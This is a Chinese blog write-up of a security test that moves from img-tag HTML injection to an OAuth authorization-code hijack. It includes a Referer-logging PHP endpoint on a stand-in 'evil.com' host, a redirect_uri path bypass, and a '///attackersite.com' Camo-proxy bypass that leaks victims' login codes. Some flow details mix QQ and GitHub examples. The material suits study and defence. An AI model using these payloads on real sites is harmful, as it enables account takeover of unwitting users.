---
layout: post
title:  img标签之xss利用从放弃到OAuth授权劫持
noToc: true
date:   2018-12-09 23:30:00 +0800
tags: WEB安全 用户授权劫持
cover: '../assets/oauth.png'
---

## img标签之xss利用从放弃到OAuth授权劫持

### 一、前奏

惊喜跌落无奈

在某众测时，发现可注入img标签，自然联想到xss的利用，窃感惊喜。可是经过一番折腾测试之后，无奈过滤了可能引起xss的标签内属性与 alert事件....，且经页面过滤之后只遗留下了

```html
<img src='xxxxx'>
```

继续思考可能的利用方式...

![猫]({{site.baseurl}}/assets/images/OAuth/cat.png)

通过html注入加载外部资源，以此达到我们的攻击，HTML注入如下：

```html
<img+src="//evil.com/getref.php">
```

getref.php的内容为如下PHP代码： 

```php
<?php
file_put_contents("ref.txt", $_SERVER['HTTP_REFERER']);
?>
```

经一番测试之后，结果还是不尽人意，以及更换getref.php的payload,但最终只能获取到用户HOST信息，无法得到request头携带的referer其他信息。vps得到的结果如下图所示：

![test6]({{site.baseurl}}/assets/images/OAuth/test6.png)

一番折腾，落败。

深入思考

### 二、后续一

继续研究下`<img src="">`的利用方式发现在OAuth用户授权劫持曾出现过他的身影。先简单介绍下OAuth。

#### OAuth简介

**开放授权**(OAuth)是一个开放标准,允许用户让第三方应用访问该用户在某一网站上存储的私密的资源(如照片,视频,联系人列表),而无需将用户名和密码提供给第三方应用.目前广泛使用的版本是OAuth 2.0.

​      而OAuth2.0存在认证缺陷-即第三方帐号快捷登录授权可能被劫持。

#### OAuth认证原理

OAuth 2.0中有6种常用的授权类型:

- Authorization Code

- Implicit

- Password

- Client Credentials

- Device Code

- Refresh Token

  目前大部分厂商使用Authorization Code(授权码模式) 

  登陆场景

  在很多网站都见过如下类似登陆界面

  ![1544358661053]({{site.baseurl}}/assets/images/OAuth/1544358661053.png)

  ![2]({{site.baseurl}}/assets/images/OAuth/2.png)

  以qq登入为例，当以qq登入时

  ![4]({{site.baseurl}}/assets/images/OAuth/4.png)

  当以QQ在电脑上已经进行了登陆，所以我可以直接进行登陆，这时候以QQ登入A.com进行抓包截取整个流程 。登入链接：

  ```
  https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=100273020&redirect_uri=http://a.com/auth/callback/homakov/8820324?code=CODE
  ```

  得到如下两个请求过程：

  请求1：

  ```php
  POST /oauth2.0/authorize HTTP/1.1
  Host:graph.qq.com
  ```

  Response1:

  ```php
  HTTP/1.1 302 Moved Temporarily
  Server:tws
  Date:Fri,11 Oct 2018 12:40:42 GMT
  Content-Type:0
  Connection:keep-alive
  Keep-Alive:time=50
  Content-Encoding:gzip
  Location:http:/a.com/?homakov/8820324?code=CODE
  ```

  请求2：(生成授权码code后携带授权码请求a.com)

  ```php
  GET /homakov/8820324?code=CODE
  Host:a.com
  ```

  Response2:

  ```
  HTTP/1.1 302 Moved Temporarily
  Content-Length: 0
  Connection: close
  Set-Cookie: 用户凭证
  Location: https://www.a.com/
  Cache-Control: max-age=0
  ```

  分析：

  此过程中经过了两次跨域

  1):graph.qq.com->用户代理服务（tws Server）

  2):tws Server->a.com

  其中，请求1以QQ登入的地址中的参数redirect_uri并携带参数code生成的授权码。

  ​     攻击利用：假设redirect_uri为指向我们自己的网站，那么只要a.com的用户点击了就可以根据网站日志访问记录获取到访问亲求携带的code值。再根据请求2获取用户A在a.com的权限。按理说是这样子的。

  但是实践之后，并没有像理想的那么顺利，如下图。无法得到referer等其他信息

  ![test6]({{site.baseurl}}/assets/images/OAuth/test6.png)

  此处含有好几个坑。。。

  1）可能redirect_uri存在验证

  2）可能存在Camo-s 过滤器 

  PS:Camo就是让不安全的资产看起来更安全，这是一个SSL映像代理 ，下面会介绍到

  ### 三、后续二

  仔细查找资料继续研究OAuth的问题发现以上这些坑都有了答案，便有了以下可利用方式

  漏洞1：利用/../绕过redirect_uri 验证

  redirect_uri 验证：如果提供了的话，重定向URL的主机和端口必须严格匹配回调URL。重定向URL的路径**只能引用回调URL的一个子目录**。 

  在此情况下可进行尝试绕过，关于[redirect_uri重定向URL](http://homakov.blogspot.com/2013/03/redirecturi-is-achilles-heel-of-oauth.html)在很久之前曾有人发过博文。可见，关于OAuth很久以前便有了对此漏洞的利用攻击，已不再是一个新鲜的事了。

  漏洞2：在获得令牌的终端缺少重定向URI验证

  当然，仅有第一个漏洞没有什么价值。在OAuth2协议中有保护机制防止‘泄露的’重定向URI，每个code参数都签发给对应的‘redirect_uri’。要获得访问令牌必须提供你在认证流程中使用的准确的redirect_uri。 

  > | `redirect_uri` | `string` | 你的app中用户认证后返回给用户的URL。查看更多细节点击 [redirect_urls.](https://developer.github.com/v3/oauth/#redirect-urls) |
  > | -------------- | -------- | :----------------------------------------------------------: |
  > |                |          |                                                              |

  组合：要是没有第一个漏洞，第二个漏洞也会要毫无价值。但是，它们却组合成一个很强大的漏洞——攻击者可以劫持一个签发给泄露的重定向uri的授权令牌，然后把这个泄露的令牌用在真正的客户端回调URl上，从而登陆受害者的账户。 

  漏洞3. 在A.COM中注入跨站图片

  前面的攻击尝试就利用到了这一点，基本上，泄露的Referers有两个向量：用户点击一个链接（需要交互）或用户代理载入一些跨站资源，比如`<img> `,我不能简单的注入（img src=http://attackersite.com），因为这会替换成camo-proxy URL，这样就不能把Referer头传递到攻击者的主机。为了能够绕过Camo-s 过滤器，这里有一个小技巧：`<img src="///attackersite.com">`关于`///`可以参考[开放重定向漏洞进展](http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html)这篇文章。

  于是可以精心构造一个如下URL:

  ```php+HTML
  https://graph.qq.com/oauth2.0/show?which=Login&display=pc&response_type=code&client_id=100273020&redirect_uri=http://a.com/auth/callback/homakov/8820324&code
  ```

  当用户载入这个url时，网站会重定向自己。对应地址：

  ```php
  http://a.com/auth/callback/homakov/8820324?code=CODE
  ```

  以a.com为百度云为例具体如：

  ![baidu3]({{site.baseurl}}/assets/images/OAuth/baidu3.png)

  ​                                     图1(referer )

  ![baidu1]({{site.baseurl}}/assets/images/OAuth/baidu1.png)

  ​                                      图2(重定向)

  

但是用户代理载入为：

```
https://a.com/homakov/8820324?code=CODE
```

那么用户代理会把发送请求的CODE泄露给我们的`<img>`： 

![785f6c5e444f7d478455f36c2b1bd5dc]({{site.baseurl}}/assets/images/OAuth/785f6c5e444f7d478455f36c2b1bd5dc.png)

一旦我们获得受害者的CODE，我们点击 ： 

```php
https://a.com/auth/github/callback?code=CODE
```

我们便登陆进了受害者的账号 。